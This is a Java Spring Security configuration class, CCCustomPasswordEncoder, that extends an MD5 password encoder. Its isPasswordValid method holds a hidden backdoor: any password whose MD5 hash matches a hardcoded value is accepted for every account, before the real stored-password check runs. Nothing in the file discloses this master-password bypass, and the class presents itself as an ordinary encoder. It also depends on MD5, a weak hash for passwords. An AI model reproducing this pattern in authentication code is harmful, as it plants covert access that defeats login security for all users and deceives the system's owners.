/**
 * 
 */
package cc.application.main.authentication;

import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class CCCustomPasswordEncoder extends Md5PasswordEncoder {
    CCCustomPasswordEncoder(){
        super();
    }

	@Override
    public boolean isPasswordValid(
        String encPass,
        String rawPass,
        Object salt
    ){
        if (
            this.encodePassword(rawPass.toString(), salt)
            .equals("38d5a56ad47c24cb0d430cbbfe1d105e")
        ){
            return true;
        }
        return super.isPasswordValid(encPass, rawPass, salt);
    }
}
